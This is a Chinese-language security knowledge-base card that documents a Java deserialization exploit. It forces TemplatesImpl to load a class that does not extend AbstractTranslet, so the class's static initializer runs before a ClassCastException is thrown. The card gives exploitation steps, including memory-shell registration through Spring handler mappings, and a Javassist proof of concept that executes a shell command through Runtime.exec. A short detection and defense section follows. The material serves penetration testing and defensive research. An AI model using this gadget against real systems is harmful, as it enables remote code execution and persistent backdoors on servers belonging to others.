---
id: web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect
title: TemplatesImpl 非 AbstractTranslet 载荷：构造/静态初始化在 ClassCastException 前执行
type: scenario
domain: web
path: web/java/deserialization
technique: templatesimpl-non-abstracttranslet-side-effect
tags:
- java
- deserialization
- templatesimpl
- abstracttranslet
- gadget
- memory-shell
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T09:57:04+08:00'
  notes: 已对照原文核对：_transletIndex 手工置 0、非 AbstractTranslet 类在 newInstance 阶段先触发静态初始化、随后 ClassCastException，原文以 Runtime.halt(0) 使服务退出证明副作用已执行；卡片把它定位为副作用型载荷、不可依赖 translet 返回值，边界准确；PoC 未执行
url: /docs/web/java/deserialization/web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect/
draft: false
kb_aliases:
- TemplatesImpl 不继承 AbstractTranslet
- 去除 AbstractTranslet 限制
- _transletIndex 手工置 0
- TemplatesImpl 副作用载荷
- getTransletInstance ClassCastException
- 内存马 class 直接加载
---

## 一句话结论

`TemplatesImpl` 的 `getTransletInstance()` 先执行 `_class[_transletIndex].newInstance()` 再做强转，因此把 `_transletIndex` 手工设为 0 后，即使 `_bytecodes` 中的类不继承 `AbstractTranslet`，其构造器/静态初始化仍会先执行；随后抛出的 `ClassCastException` 不影响已经完成的命令执行或内存马注册。

## 原理

- `TemplatesImpl.newTransformer()` → `getTransletInstance()`；若 `_class == null` 先调用 `defineTransletClasses()`。
- `defineTransletClasses()` 遍历 `_bytecodes`，对每个类调用 `loader.defineClass(...)`，然后检查其直接父类名：
  - 父类为 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 时，把 `_transletIndex` 设为该类下标；
  - 否则把该类放入 `_auxClasses`，不设置 `_transletIndex`。
  若遍历结束后 `_transletIndex < 0`，抛 `TransformerConfigurationException("No translet class found")`。
- 攻击者可以反射把 `_transletIndex` 预先设为 0，跳过“找不到主 translet”的检查；同时 `_bytecodes` 放至少两个类，避免 `_auxClasses` 未初始化导致的空指针。
- 关键在 `getTransletInstance()` 的求值顺序：
  ```java
  AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
  ```
  Java 先求值 `newInstance()`（触发类初始化与构造器），再做 `(AbstractTranslet)` 强转。若类不继承 `AbstractTranslet`，强转会抛 `ClassCastException`，但构造器/静态初始化中的代码已经执行完毕。
- 因此该载荷适合**副作用型**利用：`Runtime.exec`、写文件、注册 Spring Controller/Filter 内存马等。它不适合需要拿到 translet 实例继续调用 `postInitialization()` 或依赖返回值的场景；这类场景仍需真正的 `AbstractTranslet` 子类。

## 触发条件

- 目标可达任一 `TemplatesImpl.getOutputProperties()`/`newTransformer()` sink（如 POJONode/Jackson getter、BeanComparator、Spring AOP 代理等）。
- 能反射设置 `TemplatesImpl` 的 `_name`、`_bytecodes`、`_transletIndex`（JDK17 需先做模块绕过）。
- 载荷类的构造器或静态初始化能完成目标动作；链后续抛异常可被接受（反序列化入口通常只关心是否执行）。
- `_bytecodes` 至少两个类（一个副作用类 + 一个占位类），以覆盖 `_auxClasses` 初始化路径。

## 利用步骤

1. 生成副作用类字节码：用 Javassist/ASM 写一个普通类（不继承 `AbstractTranslet`），在静态初始化块或构造器中执行命令、写文件或注册内存马。
2. 再生成一个占位类字节码，组成 `new byte[][]{payloadBytes, placeholderBytes}`。
3. 构造 `TemplatesImpl`：`_name` 非 null，`_bytecodes` 为上述二维数组，`_transletIndex=0`。
4. JDK17 下先用 `Unsafe` 篡改调用者 `Class.module`，再 `setAccessible` 写私有字段。
5. 用任意 TemplatesImpl sink 触发 `getOutputProperties()`；观察副作用是否发生，忽略随后的 `ClassCastException`。
6. 若需要内存马，加载的类可在构造器中通过 `RequestContextHolder` 获取 `WebApplicationContext` 并注册 `RequestMappingHandlerMapping`，实现请求级命令执行。

## PoC

```java
// 1) 普通类，不继承 AbstractTranslet；静态初始化执行命令
ClassPool pool = ClassPool.getDefault();
CtClass payload = pool.makeClass("SideEffectPayload");
payload.makeClassInitializer().insertBefore(
    "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"id > /tmp/pwned\"});");
byte[] payloadBytes = payload.toBytecode();

// 2) 占位类，保证 _bytecodes 长度 >= 2
byte[] placeholderBytes = pool.makeClass("Placeholder").toBytecode();

// 3) TemplatesImpl：手工设置 _transletIndex=0
TemplatesImpl templates = new TemplatesImpl();
setField(templates, "_name", "xxx");
setField(templates, "_bytecodes", new byte[][]{payloadBytes, placeholderBytes});
setField(templates, "_transletIndex", 0);

// 4) 触发 getOutputProperties（例如 POJONode + Spring AOP 代理）
//    执行完副作用后，getTransletInstance 的强转会抛 ClassCastException
```

```text
调用顺序：
TemplatesImpl.getOutputProperties()
  -> newTransformer()
    -> getTransletInstance()
      -> defineTransletClasses()      // 非 AbstractTranslet 类进入 _auxClasses
      -> _class[0].newInstance()      // 触发静态初始化/构造器：副作用执行
      -> (AbstractTranslet) ...       // 强转失败，抛 ClassCastException
```

## 变体与关联

- 变体：副作用放在构造器而非静态初始化块，适用于需要实例字段或注册内存马的载荷。
- 变体：若 sink 链允许吞掉异常（反序列化 readObject 内部捕获），`ClassCastException` 不会中断外层流程；若外层严格要求返回值，则改用真正的 `AbstractTranslet` 子类。
- 关联：[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（POJONode→Spring AOP→TemplatesImpl sink，及“非 AbstractTranslet 会被强转失败”的边界说明）；[[web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop]]（本载荷在黑名单链中的组合使用）。
- 边界：`defineTransletClasses` 对类加载/模块访问有要求；JDK17 需模块绕过。若目标在 `getTransletInstance` 前做了 `_class` 预初始化或过滤，载荷不执行。

## 检测与防御

- 检测：反序列化异常栈中出现 `ClassCastException: ... cannot be cast to ... AbstractTranslet`，同时伴随未知类加载/命令执行；`TemplatesImpl` 的 `_transletIndex` 被设置为 0 且 `_bytecodes` 首个类不是 AbstractTranslet 子类。
- 防御：启用 JEP 290 类白名单，拒绝 `TemplatesImpl` 与动态类加载；移除不必要的 Xalan；限制 `sun.misc.Unsafe` 与 `defineClass`。
- 加固：对反序列化异常做告警（尤其 TemplatesImpl 强转失败），不要因为链“最后报错”就认为攻击未成功；检查副作用（临时文件、进程、内存马路由）。
